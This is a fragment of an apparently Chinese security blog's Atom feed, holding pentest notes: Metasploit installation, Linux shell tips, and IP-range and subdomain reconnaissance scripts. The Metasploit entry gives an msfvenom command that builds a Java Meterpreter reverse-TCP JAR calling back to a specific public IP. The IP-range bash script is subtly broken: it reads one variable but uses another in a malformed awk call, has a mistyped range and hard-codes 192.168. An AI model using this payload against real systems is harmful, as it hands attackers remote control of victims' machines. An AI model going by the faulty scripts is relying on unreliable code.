    <content type="html"><![CDATA[<p>Msf安装：</p><pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstallchmod 755 msfinstall &amp;&amp; ./msfinstall</code></pre><hr><p>Msfshell</p><pre><code>java/meterpreter/reverse_tcpmsfvenom -p java/meterpreter/reverse_tcp  LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Msf安装：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrapp
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="msf" scheme="https://10o0.github.io/tags/msf/"/>
    
      <category term="shell" scheme="https://10o0.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>linux实用技巧</title>
    <link href="https://10o0.github.io/2018/01/18/linux%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://10o0.github.io/2018/01/18/linux实用技巧/</id>
    <published>2018-01-18T01:56:49.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="自定义终端命令启动程序"><a href="#自定义终端命令启动程序" class="headerlink" title="自定义终端命令启动程序"></a>自定义终端命令启动程序</h1><blockquote><p>编辑 .bashrc 文件：</p></blockquote><pre><code>root@kali:~# vim .bashrc root@kali:~# source .bashrc</code></pre><p>exm：</p><pre><code>alias burp=&apos;setsid java -jar /root/softs/burpsuite_pro_v1.6.37.jar &gt;/dev/null 2&gt;&amp;1 &amp;&apos;echo &quot;###&quot; &gt; file  ##替换文件echo &quot;###&quot; &gt;&gt; file ##追加写入文件echo &quot;alias ss=&apos;ss start&apos;&quot; &gt;&gt; .bashrc</code></pre><hr><h1 id="设置ssh免密码登录"><a href="#设置ssh免密码登录" class="headerlink" title="设置ssh免密码登录"></a>设置ssh免密码登录</h1><pre><code>在.ssh目录下：本地主机： ssh-keygen -t rsa   ##生成id_rsa.pubcat vps_rsa.pub &gt;&gt; authorized_keys   ##写入文件复制authorized_keys到远程主机： scp -P 22 authorized_keys root@176.*.145.*:/root/.ssh从远程主机下载文件：scp -P 22 root@176.*.145.*:/root/test.txt /root/</code></pre><h1 id="批量操作文件"><a href="#批量操作文件" class="headerlink" title="批量操作文件"></a>批量操作文件</h1><pre><code>find ./ -name &quot;*.docx&quot; | awk -F &quot;.&quot; &apos;{print $2}&apos; | xargs -i -t mv ./{}.docx  ./{}.doc   #批量修改后缀名cp -r &apos;find root/a -iname *.doc&apos; root/b   #批量复制某后缀名的文件</code></pre><h1 id="配置终端使用HTTP-or-SOCKS5代理"><a href="#配置终端使用HTTP-or-SOCKS5代理" class="headerlink" title="配置终端使用HTTP or SOCKS5代理"></a>配置终端使用HTTP or SOCKS5代理</h1><blockquote><p>把代理服务器地址写入shell配置文件.bashrc或者.zshrc</p><p>直接在<strong>.bashrc</strong>或者.zshrc添加下面内容</p></blockquote><pre><code>export http_proxy=&quot;http://localhost:port&quot;export https_proxy=&quot;http://localhost:port&quot;</code></pre><blockquote><p>以使用shadowsocks代理为例，ss的代理端口为1080,那么应该设置为</p></blockquote><pre><code>export http_proxy=&quot;socks5://127.0.0.1:1080&quot;export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></pre><blockquote><p><strong>或者直接设置ALL_PROXY</strong></p></blockquote><pre><code>export ALL_PROXY=socks5://127.0.0.1:1080</code></pre><blockquote><p>然后ESC后:wq保存文件，接着在终端中执行</p></blockquote><pre><code>source ~/.bashrc</code></pre><blockquote><p>或者退出当前终端再起一个终端。 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了。</p><p><strong>或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。</strong></p></blockquote><pre><code>alias setproxy=&quot;export ALL_PROXY=socks5://127.0.0.1:1080&quot;alias unsetproxy=&quot;unset ALL_PROXY&quot;alias ip=&quot;curl ip.cn&quot;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;自定义终端命令启动程序&quot;&gt;&lt;a href=&quot;#自定义终端命令启动程序&quot; class=&quot;headerlink&quot; title=&quot;自定义终端命令启动程序&quot;&gt;&lt;/a&gt;自定义终端命令启动程序&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;编辑 .bashrc 文件：&lt;/p&gt;
&lt;/
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="bash" scheme="https://10o0.github.io/tags/bash/"/>
    
      <category term="linux" scheme="https://10o0.github.io/tags/linux/"/>
    
      <category term="sh" scheme="https://10o0.github.io/tags/sh/"/>
    
  </entry>
  
  <entry>
    <title>互联网资产搜集思路</title>
    <link href="https://10o0.github.io/2018/01/18/%E4%BA%92%E8%81%94%E7%BD%91%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/"/>
    <id>https://10o0.github.io/2018/01/18/互联网资产搜集思路/</id>
    <published>2018-01-18T01:56:49.000Z</published>
    <updated>2018-09-04T06:37:05.698Z</updated>
    
    <content type="html"><![CDATA[<p>给定域名、部分IP：</p><p>整理成C段IP，</p><figure class="highlight python"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#exp:192.168.1.1  &gt;&gt;&gt;  192.168.1.0/24</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="comment"># def cleanCLRFspace(content):</span></span><br><span class="line"><span class="comment"># noCLContext = content.replace('\n','')</span></span><br><span class="line"><span class="comment"># noSpaceCLRFcontext = noCLContext.strip()</span></span><br><span class="line"><span class="comment"># return noSpaceCLRFcontext</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readFile</span><span class="params">()</span>:</span></span><br><span class="line">ipf = open(<span class="string">'./content.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">return</span> ipf</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLineIP</span><span class="params">(ipf)</span>:</span></span><br><span class="line">ipList = set()</span><br><span class="line">texts = ipf.readlines()</span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> texts:</span><br><span class="line">ips = re.findall(<span class="string">r'\d+\.\d+?\.\d+?\.\d+?'</span>,text)</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">ipList.add(ip)</span><br><span class="line"><span class="keyword">return</span> ipList</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip2c</span><span class="params">(ipNoDup)</span>:</span></span><br><span class="line">ipset = set()</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ipNoDup:</span><br><span class="line">ipset.add(re.findall(<span class="string">r'\d+?\.\d+?\.\d+?\.'</span>,ip)[<span class="number">0</span>] + <span class="string">'0/24'</span>)</span><br><span class="line">iplist = list(ipset)</span><br><span class="line">iplist.sort()</span><br><span class="line"><span class="keyword">return</span> iplist</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveContext</span><span class="params">(s)</span>:</span></span><br><span class="line">wfile = open(<span class="string">'./result.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">wfile.write(i+<span class="string">'\n'</span>)</span><br><span class="line">wfile.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">ipf = readFile()</span><br><span class="line">ipList = getLineIP(ipf)</span><br><span class="line">iplist = ip2c(ipList)</span><br><span class="line">saveContext(iplist)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"><span class="meta">#</span>脚本名称：test.sh</span><br><span class="line"><span class="meta">#</span>使用方法：./test.sh ip.txt</span><br><span class="line"><span class="meta">#</span>备注：192.168.1.0/24  &gt;&gt;&gt; 192.168.1.0-192.168.1.254  范围IP</span><br><span class="line">while read IPRANGE</span><br><span class="line">do</span><br><span class="line">    IP_FILE_NAME=$(echo $IPRANGE | cut -d/ -f1)</span><br><span class="line">    IP_1="$(echo $IPRANGE | cut -d"." -f1-2)."</span><br><span class="line">    IP_3="$(echo $IPRANGE | cut -d"." -f3)"</span><br><span class="line">    MAX_IP_3="$(sipcalc $IPRANGE | awk -F. '/Usable range/&#123;print $6&#125;')"</span><br><span class="line">    for i in $(seq $IP_3 $MAX_IP_3)</span><br><span class="line">    do</span><br><span class="line">        for j in $(seq 1 254)</span><br><span class="line">            do</span><br><span class="line">                touch $IP_FILE_NAME.txt</span><br><span class="line">                echo "$&#123;IP_1&#125;$&#123;i&#125;.$&#123;j&#125;" &gt;&gt;ip.ini</span><br><span class="line">            done</span><br><span class="line">    done</span><br><span class="line">done &lt; $1</span><br></pre></td></tr></table></figure><p>一步到位：<br><figure class="highlight shell"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"><span class="meta">#</span>Author:netware</span><br><span class="line"><span class="meta">#</span>Date:2015-12-25</span><br><span class="line"><span class="meta">#</span>Desc:根据起始IP和结束IP输出IP信息</span><br><span class="line"><span class="meta">#</span>Usage:./iprange.sh IP.txt</span><br><span class="line"><span class="meta">#</span>notepad++去重：  ^(.*?)$\s+?^(?=.*^\1$)   操作方法如下，快捷键Ctrl+H，在弹出的界面输入表达式，并勾选匹配新行。</span><br><span class="line"><span class="meta">#</span>换行处理否则报错    /r/n     /r   全部替换为 /n</span><br><span class="line"></span><br><span class="line">while read line0</span><br><span class="line">do</span><br><span class="line"><span class="meta">#</span>echo $line1</span><br><span class="line">awk -F $line1  "-" '&#123;print $1,$2&#125;' | while read IPA IPB</span><br><span class="line">do</span><br><span class="line"> </span><br><span class="line">IPA1=`echo $IPA | awk -F '.' '&#123;print $1&#125;'`          </span><br><span class="line">IPA2=`echo $IPA | awk -F '.' '&#123;print $2&#125;'`          </span><br><span class="line">IPA3=`echo $IPA | awk -F '.' '&#123;print $3&#125;'`          </span><br><span class="line">IPA4=`echo $IPA | awk -F '.' '&#123;print $4&#125;'`          </span><br><span class="line">  </span><br><span class="line">IPB1=`echo $IPB | awk -F '.' '&#123;print $1&#125;'`          </span><br><span class="line">IPB2=`echo $IPB | awk -F '.' '&#123;print $2&#125;'`          </span><br><span class="line">IPB3=`echo $IPB | awk -F '.' '&#123;print $3&#125;'`          </span><br><span class="line">IPB4=`echo $IPB | awk -F '.' '&#123;print $4&#125;'`          </span><br><span class="line"></span><br><span class="line">IP4_not_equal()&#123;</span><br><span class="line">for i in `eval echo &#123;$IPA4..$IPB4&#125;`</span><br><span class="line">do</span><br><span class="line">echo $IPA1.$IPA2.$IPA3.$i</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IP3_not_equal () &#123;</span><br><span class="line">for i in  `eval echo &#123;$IPA3..$IPB3&#125;`</span><br><span class="line">do</span><br><span class="line">if [[ $i = $IPA3 ]]</span><br><span class="line">then</span><br><span class="line">eval echo   "192.168.$i.&#123;$IPA4..255&#125;" |xargs -n 1</span><br><span class="line">elif [[ $i = $IPB3 ]]</span><br><span class="line">then</span><br><span class="line">eval echo   "192.168.$i.&#123;1..$IPB4&#125;" |xargs -n 1</span><br><span class="line">else</span><br><span class="line">eval echo  "192.168.$i.&#123;1..255&#125;" | xargs -n 1</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IP2_not_equal()&#123;</span><br><span class="line"><span class="meta">#</span>第二段的变化范围</span><br><span class="line">for n in `eval echo &#123;$IPA2..$IPB2&#125;`</span><br><span class="line">do</span><br><span class="line">#如果第二段与IPA的第二段相同</span><br><span class="line">if [ $n = $IPA2 ] </span><br><span class="line">then  </span><br><span class="line">#第三段的变化范围为IPA3到255 </span><br><span class="line">for m in `eval echo &#123;$IPA3..255&#125;`</span><br><span class="line">do</span><br><span class="line">#如果第三段与IPA的第三段相同</span><br><span class="line">if [[ $m = $IPA3 ]]</span><br><span class="line">then</span><br><span class="line">eval echo "$IPA1.$IPA2.$IPA3.&#123;$IPA4..255&#125;" | xargs -n 1</span><br><span class="line">else</span><br><span class="line">eval echo "$IPA1.$IPA2.$m.&#123;1..255&#125;" | xargs -n 1</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line">#如果第三段与IPB的第三段相同</span><br><span class="line">elif [ $n = $IPB2 ]</span><br><span class="line">then</span><br><span class="line">#第三段变化范围为0到IPB3</span><br><span class="line">for x in `eval echo &#123;0..$IPB3&#125;` </span><br><span class="line">do</span><br><span class="line">#如果第三段与IPB的第三段相同</span><br><span class="line">if [ $x = $IPB3  ]</span><br><span class="line">then</span><br><span class="line">eval echo "$IPB1.$IPB2.$IPB3.&#123;0..$IPB4&#125;" |xargs -n 1</span><br><span class="line">else</span><br><span class="line">eval echo "$IPB1.$IPB2.$x.&#123;0..255&#125;" |xargs -n 1</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line">#如果第二段与IPA和IPB的均不相同</span><br><span class="line">else  </span><br><span class="line">#第三段变化范围</span><br><span class="line">for y in &#123;0..255&#125;</span><br><span class="line">do </span><br><span class="line">echo $IPA1.$n.$y.&#123;0..255&#125; |xargs -n 1</span><br><span class="line">done</span><br><span class="line">fi</span><br><span class="line">done </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span>定义pass函数，啥事都不做</span><br><span class="line">pass()&#123;</span><br><span class="line">echo ""&gt;/dev/null</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IP1_not_equal()&#123;</span><br><span class="line"><span class="meta">#</span>IP第一段的范围</span><br><span class="line">for d1 in `eval echo &#123;$IPA1..$IPB1&#125;`</span><br><span class="line">do</span><br><span class="line"><span class="meta">#</span>&lt;1&gt;如果第一段与IPA1相同</span><br><span class="line">if [[ $d1 = $IPA1 ]]</span><br><span class="line">then</span><br><span class="line">#第二段IP范围为IPA2到255</span><br><span class="line">for d2 in `eval echo &#123;$IPA2..255&#125;`</span><br><span class="line">do</span><br><span class="line">   #&lt;1.1&gt;如果第二段与IPA2相同</span><br><span class="line">   if [[ $d2 = $IPA2 ]]</span><br><span class="line">   then</span><br><span class="line">   #第三段IP范围为IPA3到255</span><br><span class="line">   for d3 in `eval echo &#123;$IPA3..255&#125;`</span><br><span class="line">   do</span><br><span class="line">   #&lt;1.1.1&gt;如果第三段IP与IPA3相同</span><br><span class="line">   if [[ $d3 = $IPA3  ]]</span><br><span class="line">   then</span><br><span class="line">   for d4 in `eval echo &#123;$IPA4..255&#125;`</span><br><span class="line">   do</span><br><span class="line">   echo $d1.$d2.$d3.$d4</span><br><span class="line">   done</span><br><span class="line">   #&lt;1.1.2&gt;如果第三段IP与IP3不同</span><br><span class="line">   else</span><br><span class="line">   for d4 in &#123;0..255&#125;</span><br><span class="line">   do</span><br><span class="line">   echo $d1.$d2.$d3.$d4</span><br><span class="line">   done</span><br><span class="line">   fi</span><br><span class="line">   done</span><br><span class="line">   #&lt;1.2&gt;如果第二段与IPA2不同</span><br><span class="line">   else</span><br><span class="line">   for d3 in &#123;0..255&#125;</span><br><span class="line">   do</span><br><span class="line">   for d4 in &#123;0..255&#125;</span><br><span class="line">   do</span><br><span class="line">   echo $d1.$d2.$d3.$d4</span><br><span class="line">   done</span><br><span class="line">   done</span><br><span class="line">   fi  </span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span>&lt;2&gt;如果第一段IP与IPB相同</span><br><span class="line">elif [[ $d1 = $IPB1 ]]</span><br><span class="line">then</span><br><span class="line">#第二段IP的范围为0到IPB2</span><br><span class="line">for d2 in `eval echo &#123;0..$IPB2&#125;`</span><br><span class="line">do</span><br><span class="line">#&lt;2.1&gt;如果第二段IP与IPB相同</span><br><span class="line">if [[ $d2 = $IPB2 ]]</span><br><span class="line">then</span><br><span class="line">#第三段IP范围为0到IPB3</span><br><span class="line">for d3 in `eval echo &#123;0..$IPB3&#125;`</span><br><span class="line">do</span><br><span class="line">#&lt;2.1.1&gt;如果第三段IP与IPB3相同</span><br><span class="line">if [[ $d3 = $IPB3 ]]</span><br><span class="line">then</span><br><span class="line">for d4 in `eval echo &#123;0..$IPB4&#125;`</span><br><span class="line">do</span><br><span class="line">echo $d1.$d2.$d3.$d4</span><br><span class="line">done</span><br><span class="line">#&lt;2.1.2&gt;如果第三段IP与IPB3不同</span><br><span class="line">else</span><br><span class="line">for d4 in &#123;0..255&#125;</span><br><span class="line">do</span><br><span class="line">echo $d1.$d2.$d3.$d4</span><br><span class="line">done</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line">#&lt;2.2&gt;如果第二段IP与IPB不相同</span><br><span class="line">else</span><br><span class="line">   #第三段IP范围为&#123;0..255&#125;</span><br><span class="line">   for d3 in &#123;0..255&#125;</span><br><span class="line">   do</span><br><span class="line">   #第四段IP范围为&#123;0.255&#125;</span><br><span class="line">   for d4 in &#123;0.255&#125;</span><br><span class="line">   do</span><br><span class="line">   echo $d1.$d2.$d3.$d4</span><br><span class="line">   done</span><br><span class="line">   done</span><br><span class="line">fi</span><br><span class="line">done     </span><br><span class="line"><span class="meta">#</span>&lt;3&gt;第一段IP与IPA1和IPB1都不相同</span><br><span class="line">else</span><br><span class="line">for d2 in &#123;0..255&#125;</span><br><span class="line">do</span><br><span class="line">for d3 in &#123;0..255&#125;</span><br><span class="line">do </span><br><span class="line">for d4 in &#123;0..255&#125;</span><br><span class="line">do</span><br><span class="line">echo $d1.$d2.$d3.$d4</span><br><span class="line">done</span><br><span class="line">done</span><br><span class="line">done</span><br><span class="line">fi   </span><br><span class="line">done    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">print_range_ip()&#123; </span><br><span class="line"><span class="meta">#</span>&lt;1&gt;如果两IP第一段不同</span><br><span class="line">if [ $IPA1 != $IPB1 ]</span><br><span class="line">then</span><br><span class="line">IP1_not_equal </span><br><span class="line"><span class="meta">#</span>&lt;2&gt;如果两IP第一段相同</span><br><span class="line">else</span><br><span class="line"><span class="meta">#</span>&lt;2.1&gt; 如果第二段IP相同</span><br><span class="line">if [ $IPA2 = $IPB2 ]</span><br><span class="line">then</span><br><span class="line">#&lt;2.1.1&gt;如果第三段IP不相同</span><br><span class="line">if [[ $IPA3 != $IPB3 ]]</span><br><span class="line">then</span><br><span class="line">IP3_not_equal </span><br><span class="line">#&lt;2.2.2&gt;如果第三段IP相同</span><br><span class="line">else</span><br><span class="line">IP4_not_equal</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>&lt;2.2&gt; 如果第二段IP不相同</span><br><span class="line">else</span><br><span class="line">IP2_not_equal</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line">print_range_ip &gt;&gt; allssip.txt</span><br><span class="line">done</span><br><span class="line">done &lt; $1</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>IP整理完通过工具扫描</p><p>爆破子域名</p><figure class="highlight shell"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"><span class="meta">#</span>usage:&gt;.sh domain.txt</span><br><span class="line"></span><br><span class="line">while read line1</span><br><span class="line">do</span><br><span class="line"><span class="meta">#</span>echo $line1</span><br><span class="line">echo python subDomainsBrute.py -i $line1 --full -o $line1</span><br><span class="line">done &lt; $1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bat"><figcaption><span>[] [centos_shell]</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off&amp;<span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (pufadomainbat.txt) <span class="keyword">do</span> <span class="built_in">set</span> "website=<span class="variable">%%i</span>"&amp;<span class="keyword">call</span> :s <span class="variable">!website!</span></span><br><span class="line"><span class="built_in">pause</span></span><br><span class="line">:s</span><br><span class="line">python subDomainsBrute.py -i %<span class="number">1</span> --full -o %<span class="number">1</span></span><br><span class="line"><span class="keyword">goto</span> :eof</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;给定域名、部分IP：&lt;/p&gt;
&lt;p&gt;整理成C段IP，&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;figcaption&gt;&lt;span&gt;[] [centos_shell]&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="bash" scheme="https://10o0.github.io/tags/bash/"/>
    
      <category term="linux" scheme="https://10o0.github.io/tags/linux/"/>
    
      <category term="sh" scheme="https://10o0.github.io/tags/sh/"/>
    
  </entry>
  
  <entry>
    <title>linux入侵检测基础</title>
    <link href="https://10o0.github.io/2018/01/18/linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80/"/>
    <id>https://10o0.github.io/2018/01/18/linux入侵检测基础/</id>
    <published>2018-01-18T01:30:05.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
